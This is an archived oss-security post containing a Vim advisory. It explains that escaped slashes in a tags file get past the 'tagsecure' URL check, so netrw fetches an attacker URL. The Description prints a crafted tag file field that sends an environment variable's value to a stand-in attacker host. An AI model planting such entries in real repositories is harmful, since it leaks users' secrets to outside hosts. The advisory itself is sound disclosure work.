---
title: "[vim-security] 'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352"
source: https://seclists.org/oss-sec/2026/q4/716
source_host: seclists.org
clip_date: 2026-11-19T08:19:27+08:00
trace_id: 0b2417ee-941d-472b-a77d-6ec2f7db413c
content_hash: df330a38a09a0dd09cc139def82636c7bb6e12353863f12294ab4d273d63e665
status: synced
tags: []
series: null
feed_source: oss-security·漏洞披露
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-81b9-b623-ebfd5e53ee4e
ioc:
  cves: []
  cwes:
    - CWE-184
  hashes: []
  domains: []
  tools: []
  techniques: []
---

## oss-sec mailing list archives

## \[vim-security\] 'tagsecure' Bypass via Escaped URL in Tags File in Vim < 9.2.1352

* * *

*From*: Christian Brabandt <cb () 256bit org>  
*Date*: Sun, 15 Nov 2026 16:24:06 +0100  

* * *

```bash
'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352
==================================================================

Date: 15.11.2026
Severity: Low
CVE: *requested, not yet assigned*
CWE: Incomplete List of Disallowed Inputs (CWE-184)

## Summary

Patch 9.2.0405 made Vim refuse a file name in a tags file that is a URL;
patch 9.2.0497 made this configurable with the 'tagsecure' option.  The check
is done before the file name is expanded.  A file name with escaped slashes
like `http:\/\/` therefore passes the check and is then opened as a URL by
the netrw plugin.

## Description

When jumping to a tag, `expand_tag_fname()` rejects the file field of the
tag entry if it is a URL and 'tagsecure' is set.  Afterwards, a file field
containing wildcards or environment variables is expanded, which removes
backslashes and expands `$VAR`.  A file field like:

    http:\/\/attacker.example/$SECRET/x*

is not recognized as a URL, but expands to
`http://attacker.example/<value of $SECRET>/x*`, which netrw then fetches.

## Impact

A network request to an attacker-controlled host, which may contain the
values of environment variables.  Exploitation requires:

- Vim with the netrw plugin enabled
- the victim using a crafted tags file, e.g. from a cloned repository, and
  jumping to a tag from it.

The severity is rated Low because no command execution is possible and
leaking environment variables requires the attacker to guess their names.

## Acknowledgements

The Vim project would like to thank Zachariah Mithani for reporting the issue.

## References

The issue has been fixed as of Vim patch [v9.2.1352](https://github.com/vim/vim/releases/tag/v9.2.1352).

- [Commit](https://github.com/vim/vim/commit/8da4660cf4068e6812b4eacdf78c8b05c7774d9a)
- [Github Security Advisory](https://github.com/vim/vim/security/advisories/GHSA-j6wv-2276-36jq)

Best,
Christian
-- 
Mancher hat nach der Antike studiert und sich ihr Wesen nicht
ganz zugeeignet. Ist er darum scheltenswert?
                -- Goethe, Maximen und Reflektionen, Nr. 1145
```
